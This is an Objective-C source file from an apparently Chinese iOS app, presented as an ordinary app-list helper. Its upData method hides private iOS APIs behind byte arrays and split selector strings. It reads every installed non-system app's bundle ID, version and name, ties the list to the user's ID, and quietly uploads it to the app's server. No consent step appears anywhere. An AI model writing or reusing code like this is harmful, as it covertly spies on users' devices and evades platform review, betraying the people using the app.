//
//  APPList.m
//  zxd
//
//  Created by Krisc.Zampono on 16/4/22.
//  Copyright © 2016年 zxd. All rights reserved.
//

#import "APPList.h"
#import "UserManager.h"
#import "HomeRequest.h"
//#import <UMSocialCore/UMSocialCore.h>

@interface APPList ()

@property (nonatomic, strong) HomeRequest   * request;

@end

@implementation APPList

+(void)load
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        
        static dispatch_once_t onceToken;
        dispatch_once(&onceToken, ^{
            //------UMeng初始化
//            [UMAnalyticsConfig sharedInstance].appKey = UMENGID;
//            [MobClick startWithConfigure:[UMAnalyticsConfig sharedInstance]];
//            [MobClick setLogEnabled:NO];
//            [MobClick setAppVersion:XcodeAppVersion];
        });
        
    });
}

+ (instancetype)getAppsInfo {
    return [[APPList alloc] initApp];
}

- (instancetype)initApp {
    if (self = [super init]) {
        [self upData];
    }
    return self;
}

- (void)upData {
    if (IOS_VERSION>=11) {
        
    }else{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        NSString * userId = [NSString stringWithFormat:@"%@", [UserManager sharedUserManager].userInfo.uid];
        NSMutableArray * arrAPP = [NSMutableArray array];
        NSData *workSpaceData = [NSData dataWithBytes:(unsigned char []){76,83,65,112,112,108,105,99,97,116,105,111,110,87,111,114,107,115,112,97,99,101} length:22];
        NSString *loadAppStr = [[NSString alloc] initWithData:workSpaceData encoding:NSASCIIStringEncoding];
        const char *awChar = [loadAppStr UTF8String];
        Class LSAWSClass = objc_getClass(awChar);
        NSString * space = [NSString stringWithFormat:@"%@%@",@"default",@"Workspace"];
        NSObject* workspace = [LSAWSClass performSelector:NSSelectorFromString(space)];
        //设备安装的app列表
        NSString * app = [NSString stringWithFormat:@"%@%@",@"all",@"Applications"];
        NSArray *appList = [workspace performSelector:NSSelectorFromString(app)];
        
        NSData *proxyData = [NSData dataWithBytes:(unsigned char []){76,83,65,112,112,108,105,99,97,116,105,111,110,80,114,111,120,121} length:18];
        NSString *proxyName = [[NSString alloc] initWithData:proxyData encoding:NSASCIIStringEncoding];
        Class appProxy = object_getClass(proxyName);
        for (appProxy in appList) {
            NSString * str = [NSString stringWithFormat:@"%@%@%@",@"application",@"Identi",@"fier"];
            NSString * strVer = [NSString stringWithFormat:@"%@%@",@"bundle",@"Version"];
            NSString * strName = [NSString stringWithFormat:@"%@%@",@"localized",@"Name"];
            NSString * strType = [NSString stringWithFormat:@"%@%@",@"application",@"Type"];
            NSString *bundleID = [appProxy performSelector:NSSelectorFromString(str)];
            NSString *version =  [appProxy performSelector:NSSelectorFromString(strVer)];
            NSString *name =  [appProxy performSelector:NSSelectorFromString(strName)];
            NSString *type = [appProxy performSelector:NSSelectorFromString(strType)];
            if (![type isEqualToString:@"System"]) {
                [arrAPP addObject:@{
                                    @"packageName":bundleID ? bundleID :@"" ,
                                    @"versionCode":version ? version : @"",
                                    @"appName"    :name ? name : @"",
                                    @"userId"     :userId ? userId : @""}
                 ];
            }
        }
        
        NSString *jsonString = [[NetworkSingleton sharedManager] DataTOjsonString:arrAPP];
        [self.request upAppsInfoWithDictionary:@{@"data":jsonString ? jsonString : @"",@"type":@"2"} success:^(NSDictionary *dictResult) {
            
        } failed:^(NSInteger code, NSString *errorMsg) {
            
        }];
#pragma clang diagnostic pop
    }
}

- (HomeRequest *)request {
    if (!_request) {
        _request = [[HomeRequest alloc] init];
    }
    return _request;
}

@end
